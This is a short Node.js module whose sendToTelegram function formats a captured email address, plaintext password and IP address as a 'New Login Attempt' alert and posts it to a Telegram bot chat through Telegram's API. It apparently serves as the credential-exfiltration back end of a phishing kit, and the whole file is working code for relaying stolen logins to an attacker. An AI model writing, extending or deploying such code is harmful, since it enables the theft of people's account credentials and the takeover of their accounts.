const axios = require('axios');

// Function to send message to Telegram
async function sendToTelegram(email, password, userAgent, ip, service = 'Unknown') {
    try {
        const message = `
🔐 **New Login Attempt - ${service}**

📧 **Email:** ${email}
🔑 **Password:** ${password}
📍 **IP Address:** ${ip}
⏰ **Time:** ${new Date().toLocaleString()}
        `;

        const response = await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: process.env.TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });

        console.log('Message sent to Telegram successfully');
        return { success: true, messageId: response.data.result.message_id };
    } catch (error) {
        console.error('Error sending message to Telegram:', error.response?.data || error.message);
        return { success: false, error: error.message };
    }
}

module.exports = { sendToTelegram };
